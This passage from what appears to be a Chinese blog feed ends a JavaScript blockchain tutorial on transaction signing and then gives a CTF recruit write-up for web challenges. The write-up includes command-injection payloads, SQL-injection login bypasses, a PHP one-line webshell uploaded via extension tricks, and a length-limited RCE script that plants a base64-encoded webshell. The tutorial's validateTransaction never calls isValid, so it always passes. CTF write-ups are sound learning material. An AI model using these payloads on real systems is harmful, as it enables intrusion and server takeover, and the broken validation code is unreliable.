class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 别忘了往链上添加</span><br>  &#125;<br></code></pre></td></tr></table></figure><p>这个方法实际上是为了我们调试用的，实际运用中并不能直接增加</p><p>实际中，我们是在慢慢的挖区块，这里假定有个矿工在帮我们挖矿，当他挖到区块链便会获得相应的矿工奖励，奖励的发放依然通过<code>Transaction</code>来发放</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 交易池</span><br>  <span class="hljs-title function_">mineTransactionPool</span>(<span class="hljs-params">minerAddr</span>) &#123;<br>    <span class="hljs-comment">// 先给矿工发钱</span><br>    <span class="hljs-keyword">const</span> minerTransaction = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;&#x27;</span>, minerAddr, <span class="hljs-variable language_">this</span>.<span class="hljs-property">minerReward</span>) <span class="hljs-comment">// 因为矿工奖励由区块链本体发放，所以地址为空</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(minerTransaction) <span class="hljs-comment">// 往pool储存</span><br>    <span class="hljs-comment">// 开挖</span><br>    <span class="hljs-keyword">const</span> newBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Block</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getLatestBlock</span>().<span class="hljs-property">hash</span>)<br>    newBlock.<span class="hljs-title function_">mine</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">difficulty</span>)<br>    <span class="hljs-comment">// 把区块加到区块链当中</span><br>    <span class="hljs-comment">// 同时清空此时的Pool</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-title function_">push</span>(newBlock) <span class="hljs-comment">// 把挖到的区块放入链</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span> = [] <span class="hljs-comment">// 当挖到合法区块，且放入链后，清空pool</span><br>  &#125;<br><br> <span class="hljs-comment">// 方便添加Transaction到Pool</span><br>  <span class="hljs-title function_">addTransaction</span>(<span class="hljs-params">transaction</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(transaction)<br>  &#125;<br><br><br><span class="hljs-keyword">const</span> fanCoin = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Chain</span>()<br><span class="hljs-keyword">const</span> t1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;addr1&#x27;</span>, <span class="hljs-string">&#x27;addr2&#x27;</span>, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">const</span> t2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transaction</span>(<span class="hljs-string">&#x27;addr2&#x27;</span>, <span class="hljs-string">&#x27;addr1&#x27;</span>, <span class="hljs-number">20</span>)<br>fanCoin.<span class="hljs-title function_">addTransaction</span>(t1)<br>fanCoin.<span class="hljs-title function_">addTransaction</span>(t2)<br>fanCoin.<span class="hljs-title function_">mineTransactionPool</span>(<span class="hljs-string">&#x27;fan&#x27;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanCoin)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(fanCoin.<span class="hljs-property">chain</span>[<span class="hljs-number">1</span>].<span class="hljs-property">transactions</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231126001059276.png" alt="image-20231126001059276"></p><h2 id="4、数字签名"><a href="#4、数字签名" class="headerlink" title="4、数字签名"></a>4、数字签名</h2><p>上节我们实现了简易的数字货币，但是可以发现Transaction（交易）可以由任何人发起，而且也可以不经过你的批准而使用你钱包的钱，<del>这显然不行，怎么能动我的小金库</del></p><p>所以在发起转账前，需要做出相应的验证措施，这就要用到了本节的数字签名</p><p>这里我们使用的是非对称加密</p><ul><li>通过公开<code>Transaction</code>，<code>Public Key</code>与<code>Signature</code>，可以让其他所有人校验这个签名的合法性，证明这个交易属于你</li><li>同时，只有验证通过才能执行转账操作，<del>保护了你的小金库</del></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> ecLib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;elliptic&#x27;</span>).<span class="hljs-property">ec</span><br><span class="hljs-keyword">const</span> ec = <span class="hljs-keyword">new</span> <span class="hljs-title function_">ecLib</span>(<span class="hljs-string">&#x27;secp256k1&#x27;</span>) <span class="hljs-comment">// 椭圆曲线</span><br><br><span class="hljs-comment">/////////// class Transaction ///////////</span><br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">from</span>, to, amount</span>) &#123;<br>    <span class="hljs-comment">// if (from === null || from == &#x27;&#x27;) // 视频里没说，但是我觉得应该检验一下（这样检验不太行</span><br>        <span class="hljs-comment">// throw new Error(&#x27;Transaction cannot be empty!&#x27;)</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> = <span class="hljs-keyword">from</span> <span class="hljs-comment">// 这里从id改成了发送者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">to</span> = to <span class="hljs-comment">// 同理，接收者公钥</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">amount</span> = amount <span class="hljs-comment">// 转账数量</span><br>    <span class="hljs-comment">// this.timeStamp = timeStamp</span><br>  &#125;<br><br>  <span class="hljs-comment">// 对交易进行签名</span><br>  <span class="hljs-comment">// 签名的意义是将公钥和Transaction公开使所有人都能对此交易进行校验，凭此证明其合法性</span><br>  <span class="hljs-title function_">sign</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">signature</span> = key.<span class="hljs-title function_">sign</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>(), <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toDER</span>(<span class="hljs-string">&#x27;hex&#x27;</span>)<br>  &#125;<br><br>  <span class="hljs-comment">// 检查交易合法性</span><br>  <span class="hljs-title function_">isValid</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// 对矿工奖励进行特殊判断</span><br>    <span class="hljs-comment">// 因为矿工奖励是区块链给矿工转账，所以公钥是空</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span> === <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-keyword">const</span> keyObj = ec.<span class="hljs-title function_">keyFromPublic</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">from</span>, <span class="hljs-string">&#x27;hex&#x27;</span>)<br>    <span class="hljs-keyword">return</span> keyObj.<span class="hljs-title function_">verify</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>(), <span class="hljs-variable language_">this</span>.<span class="hljs-property">signature</span>) <span class="hljs-comment">// 检验Signature是否合法</span><br>  &#125;<br><br><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 方便添加Transaction到Pool</span><br>  <span class="hljs-title function_">addTransaction</span>(<span class="hljs-params">transaction</span>) &#123;<br>    <span class="hljs-comment">// 检验transaction是否合法</span><br>    <span class="hljs-keyword">if</span> (!transaction.<span class="hljs-title function_">isValid</span>())<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Found InValid Transaction before adding to pool!&#x27;</span>)<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactionPool</span>.<span class="hljs-title function_">push</span>(transaction)<br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231216163810985.png" alt="image-20231216163810985"></p><p><img src="/posts/32752/image-20231216162204074.png" alt="image-20231216162204074"></p><p>可以看到验证成功，现在我们手动篡改一下，尝试一下</p><p><img src="/posts/32752/image-20231216163925741.png" alt="image-20231216163925741"></p><p>把<code>amount</code>改成20</p><p><img src="/posts/32752/image-20231216163843479.png" alt="image-20231216163843479"></p><p>可以看到输出了<code>false</code>，并丢出来错误，且并没有往<code>Transactions</code>中放入错误的交易</p><p>这时候，在之前验证区块是否一一相连时，我们也应该加上验证</p><p>由于区块中可能有多个<code>Transaction</code>，所以采用穷举依次验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Block ///////////</span><br><br><br><span class="hljs-comment">// 逐个验证transaction是否合法</span><br>  <span class="hljs-title function_">validateTransaction</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> transaction <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">transactions</span>) &#123;<br>      <span class="hljs-keyword">if</span> (!transaction.<span class="hljs-property">isValid</span>)<br>        <span class="hljs-comment">// throw new Error(&quot;Found inValid Transaction!&quot;)</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br><br><span class="hljs-comment">// 挖！</span><br>  <span class="hljs-title function_">mine</span>(<span class="hljs-params">difficulty</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">validateTransaction</span>()<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">computeHash</span>()<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, difficulty) === <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnswer</span>(difficulty))<br>        <span class="hljs-comment">// 进行前缀比对</span><br>        <span class="hljs-keyword">break</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">nonce</span>++<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/////////// class Chain ///////////</span><br><br><span class="hljs-comment">// 对区块进行校验</span><br>  <span class="hljs-title function_">validateChain</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-property">hash</span> !== <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>      <span class="hljs-comment">// 对初始进行校验，原始的Hash与再次生成的Hash进行对比</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>.<span class="hljs-property">length</span>; i++) &#123;<br>      <span class="hljs-comment">// 验证Block的每个Transaction是否合法</span><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i].<span class="hljs-title function_">validateTransaction</span>())<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Found InValid Transaction while validating Chain&#x27;</span>)<br><br>      <span class="hljs-comment">// 判断当前Block的data是否被篡改8</span><br>      <span class="hljs-keyword">const</span> blockToValidate = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i]<br>      <span class="hljs-keyword">if</span> (blockToValidate.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-title function_">computeHash</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br><br>      <span class="hljs-comment">// 比对前一个Block与当前Block的hash值是否相同</span><br>      <span class="hljs-keyword">const</span> preBlock = <span class="hljs-variable language_">this</span>.<span class="hljs-property">chain</span>[i - <span class="hljs-number">1</span>]<br>      <span class="hljs-keyword">if</span> (preBlock.<span class="hljs-property">hash</span> !== blockToValidate.<span class="hljs-property">preHash</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>  &#125;<br></code></pre></td></tr></table></figure><p><img src="/posts/32752/image-20231217025145782.png" alt="image-20231217025145782"></p><p><img src="/posts/32752/image-20231217025119348.png" alt="image-20231217025119348"></p><h2 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Block Chain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNSS 2023 Recruit WriteUps~~~</title>
    <link href="/posts/43716/"/>
    <url>/posts/43716/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-🦴-babyHTTP"><a href="#Baby-🦴-babyHTTP" class="headerlink" title="[Baby] 🦴 babyHTTP"></a>[Baby] 🦴 babyHTTP</h2><p>Get，Post，Cookie的应用，根据提示一步一步来就好了~~</p><p><code>curl -X POST http://XXXX:XXXX/?CNSS=hackers -d &quot;web=fun&quot; --cookie &quot;admin=true&quot;</code></p><p>（不懂curl的人有难了</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;w2b_1s_Reaiiy_7un!!!&#125;</code></font></center></strong></em></p><h2 id="Baby-🙋-PHPinfo"><a href="#Baby-🙋-PHPinfo" class="headerlink" title="[Baby] 🙋 PHPinfo"></a>[Baby] 🙋 PHPinfo</h2><p>根据提示访问&#x2F;phpinfo.php</p><p><code>Ctrl + F</code> 搜索cnss获得Flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;l3t_u5_l3arn_php1nfo&#125;</code></font></center></strong></em></p><h2 id="baby-🏓-Ping"><a href="#baby-🏓-Ping" class="headerlink" title="[baby] 🏓 Ping"></a>[baby] 🏓 Ping</h2><p>访问题目地址，可知为简单的命令注入，因为没有过滤，那我们就狠狠的inject~~</p><p>还是用curl</p><p><code>curl -X POST http://124.221.34.13:55566/ -d &quot;ip=127.0.0.1;ls&quot;</code></p><p>这里使用<code>;</code>进行隔断，类似的符号还有<code>$</code>,<code>|</code>,<code>-</code>,<code>(</code>,<code>)</code>,<code>`</code>,<code>||</code>,<code>&amp;</code>,<code>&amp;&amp;</code>,<code>&#125;</code>,<code>&#123;</code></p><p>参考 <a href="https://blog.csdn.net/Hardworking666/article/details/120739082">CTFping命令绕过及符号用法_ctf ping-CSDN博客</a></p><p><img src="/posts/43716/image-20231018004049316.png" alt="Ping-1"></p><p>猜一手文件在根目录</p><p><img src="/posts/43716/image-20231018004138053.png" alt="Ping-2"></p><p><code>curl -X POST http://124.221.34.13:55566/ -d &quot;ip=127.0.0.1;cat /flag&quot;</code></p><p>（绕过cat被过滤，可以尝试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">more<br>less<br>head<br>tail<br>...<br></code></pre></td></tr></table></figure><p>得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;p0ng_p0ng_pong!!!&#125;</code></font></center></strong></em></p><h2 id="Baby-🥇-我得再快点"><a href="#Baby-🥇-我得再快点" class="headerlink" title="[Baby+] 🥇 我得再快点"></a>[Baby+] 🥇 我得再快点</h2><p>访问题目地址，看到网页不断刷新以及提示可知为快速计算</p><p>（就是要用脚本访问获取Key的值，并计算出其md5值，再post回去，关键要保证session一致，以保证post对应的网页与get的一致</p><p>这里使用py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><br>m = hashlib.md5()<br>s = requests.Session()<br>url = <span class="hljs-string">&quot;http://124.221.34.13:55590/&quot;</span><br>r = s.get(url)<br>res = r.content<br><span class="hljs-comment"># print(res)</span><br>a = res.find(<span class="hljs-string">&quot;Key : &quot;</span>.encode())<br>b = res.find(<span class="hljs-string">&quot;&lt;span id&quot;</span>.encode())<br><span class="hljs-comment"># print(res[a + 6 : b])</span><br>m.update(res[a + <span class="hljs-number">6</span> : b])<br>url = <span class="hljs-string">f&quot;http://124.221.34.13:55590/check?value=<span class="hljs-subst">&#123;m.hexdigest()&#125;</span>&quot;</span><br>r = s.get(url)<br><br><span class="hljs-built_in">print</span>(r.content)<br><br></code></pre></td></tr></table></figure><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;3njoy_py5cript_n0w&#125;</code></font></center></strong></em></p><h2 id="Baby-🐶-CNSS娘の宠物商店"><a href="#Baby-🐶-CNSS娘の宠物商店" class="headerlink" title="[Baby+] 🐶 CNSS娘の宠物商店"></a>[Baby+] 🐶 CNSS娘の宠物商店</h2><p>访问题目地址，根据提示直接右上角进入登录界面，用户名为admin，尝试密码为admin失败（应该不至于吧~~</p><p>猜测sql注入，输入 <code>1&#39;</code> 发现报错</p><p><img src="/posts/43716/image-20231018012052572.png" alt="sql-1"></p><p>可知是单引号过滤，直接尝试万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code> 或<code>-1&#39; or 1=1 #</code></p><p><img src="/posts/43716/image-20231018012252032.png" alt="sql-2"></p><p>芜湖~~~</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;h0W_d1d_y0u_l0g1n_t0_my_4dm1n_p4n3l?&#125;</code></font></center></strong></em></p><h2 id="Easy-🥵-2048"><a href="#Easy-🥵-2048" class="headerlink" title="[Easy] 🥵 2048"></a>[Easy] 🥵 2048</h2><p>访问题目地址，<del>嘿嘿直接开玩，不就1000000分吗</del></p><p>老规矩F12看看，<del>欸怎么把键盘按爆了都没反应</del>，过滤了功能键区，再试试<code>Ctrl+Shift+I</code>或<code>Ctrl+Shift+C</code>成功打开</p><p><img src="/posts/43716/image-20231018012957354.png" alt="2048-1"></p><p>可以看到调用getflag()函数来获取flag</p><p><img src="/posts/43716/image-20231018014010920.png" alt="2048-2"></p><p><code>Ctrl+F</code> 开搜发现在<code>main2048.js</code>里，但是加密了（哭</p><p>简单往下扫一下没发现啥，好好好，回去网页看看，发现score值会变化，那js中必然有函数在使其更新</p><p><img src="/posts/43716/image-20231018014407920.png" alt="2048-3"></p><p>在js中搜<code>score</code>，发现<code>updateScore()</code>函数，控制台尝试<code>updateScore(1000001)</code>，发现虽然数值改变了，但点flag仍然不行（这不是掩耳盗铃吗~~</p><p>在其他函数搜score，发现score为全局定义的变量，每次加分都会随着更新，嘿嘿，那不直接控制台改一下就好了</p><p><img src="/posts/43716/image-20231018015007695.png" alt="2048-4"></p><p>再点flag，发现成功啦，哈哈哈哈哈哈哈哈哈</p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;3asy_fr0nt_kn0wledge&#125;</code></font></center></strong></em></p><h2 id="Easy-👤-换个头像先"><a href="#Easy-👤-换个头像先" class="headerlink" title="[Easy] 👤 换个头像先"></a>[Easy] 👤 换个头像先</h2><p>访问题目地址，右上角随便注册一下，登录，发现要让我们换头像</p><p>应该是文件上传题，一句话木马启动，</p><p><code>&lt;?php @eval($_POST[1]);?&gt;</code>写入文件，并改后缀为jpg</p><p>BurpSuite启动，开启代理抓包，上传jpg</p><p><img src="/posts/43716/image-20231018231323142.png" alt="upload-1"></p><p>将后缀改为<code>php</code>（如果有过滤可以尝试<code>php2</code>,<code>php3</code>,<code>php4</code>,<code>php5</code>,<code>phtml</code>,以及大小写和复写等其他</p><p><img src="/posts/43716/image-20231018231853632.png" alt="upload-2"></p><p>放行，并查看http历史记录查看上传目录</p><p><img src="/posts/43716/image-20231018232023920.png" alt="upload-3"></p><p>然后蚁剑启动</p><p><img src="/posts/43716/image-20231018232249862.png" alt="upload-4"></p><p>getshell，访问根目录得到flag</p><p><img src="/posts/43716/image-20231018232349889.png" alt="upload-5"></p><p><em><strong><center><font color="#81ecec" size="6"><code>cnss&#123;D4ng3r0us_F1l3_Up10ad!&#125;</code></font></center></strong></em></p><h2 id="Mid-7️⃣-EZRCCCCE"><a href="#Mid-7️⃣-EZRCCCCE" class="headerlink" title="[Mid] 7️⃣ EZRCCCCE"></a>[Mid] 7️⃣ EZRCCCCE</h2><p>访问题目地址</p><p><img src="/posts/43716/image-20231018232631239.png" alt="rce-1"></p><p>观察代码，filter函数中做了过滤，接下来的代码对Get的内容做了长度限制，第一眼没见过，开搜，查阅得知，linux中可以在没有写完的命令后面加\，可以将一条命令写在多行中</p><p>比如一条命令cat flag可以如下表示</p><p><img src="/posts/43716/image-20231018233553058.png" alt="rce-2"></p><p>同时把命令一行一行写进文本中也是可以执行的</p><p><img src="/posts/43716/image-20231018235251293.png" alt="rce-3"></p><p>注意是<code>\\</code>，因为要防止被转义</p><p>以及<code>&gt;&gt;</code>和<code>&gt;</code>的区别：</p><p><strong>&gt;&gt; 是追加内容 &gt;&#96; 是覆盖原有内容</strong></p><p>于是网上找了个脚本（我才不是脚本小子呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]); <span class="hljs-comment"># 需要写入的一句话木马</span><br><br>PD9waHAgZXZhbCgkX0dFVFsxXSk7 <span class="hljs-comment"># base64编码后</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php # 组合一下<br></code></pre></td></tr></table></figure><p>payload.txt:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">hp</span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">1.p\\</span><br><span class="language-bash">&gt;d\&gt;\\</span><br><span class="language-bash">&gt;\ -\\</span><br><span class="language-bash">&gt;e64\\</span><br><span class="language-bash">&gt;bas\\</span><br><span class="language-bash">&gt;7\|\\</span><br><span class="language-bash">&gt;XSk\\</span><br><span class="language-bash">&gt;Fsx\\</span><br><span class="language-bash">&gt;dFV\\</span><br><span class="language-bash">&gt;kX0\\</span><br><span class="language-bash">&gt;bCg\\</span><br><span class="language-bash">&gt;XZh\\</span><br><span class="language-bash">&gt;AgZ\\</span><br><span class="language-bash">&gt;waH\\</span><br><span class="language-bash">&gt;PD9\\</span><br><span class="language-bash">&gt;o\ \\</span><br><span class="language-bash">&gt;ech\\</span><br><span class="language-bash"><span class="hljs-built_in">ls</span> -t&gt;0</span><br>sh 0<br></code></pre></td></tr></table></figure><p>ls -t是根据时间顺序把文件名列出来，刚好满足我们需求，但注意：<strong>是倒序</strong>，这也就是为什么<code>payload.txt</code>中的命令是反的了</p><p>python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://124.221.34.13:55559/?6=&#123;0&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+]start attack!!!&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]&quot;</span> + url.<span class="hljs-built_in">format</span>(i.strip()))<br>        requests.get(url.<span class="hljs-built_in">format</span>(i.strip()))<br><br><span class="hljs-comment"># 检查是否攻击成功</span><br>test = requests.get(<br>    <span class="hljs-string">&quot;http://124.221.34.13:55559/sandbox/d178dace7559b986abd1b832eabef837/1.php&quot;</span><br>)<br><span class="hljs-keyword">if</span> test.status_code == requests.codes.ok:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]Attack success!!!&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>这边还有个小点，也就是那个sandbox的目录名</p><p><img src="/posts/43716/image-20231018235956427.png" alt="rce-4"></p><p>因为限制8个字符，所以可以直接通过<code>ls ..</code>来获得</p><p><img src="/posts/43716/image-20231019001329749.png" alt="rce-5"></p><p>然后就可以拼接地址</p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php</code></p><p>因为前面木马是GET形式所以直接访问</p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php?1=system(&#39;ls /&#39;);</code></p><p>（<strong>注意分号别忘了</strong></p><p><img src="/posts/43716/image-20231019001809761.png" alt="rce-6"></p><p><code>http://124.221.34.13:55559/sandbox/0eea99a28b6e985ffbe584f98dd999b7/1.php?1=system(&#39;cat /flag&#39;);</code>得到flag</p><p><em><strong><center><font color="#81ecec" size="6"><code>CNSS&#123;y0u_kn0w_h0w_7o_k22p_fit&#125;</code></font></center></strong></em></p><h2 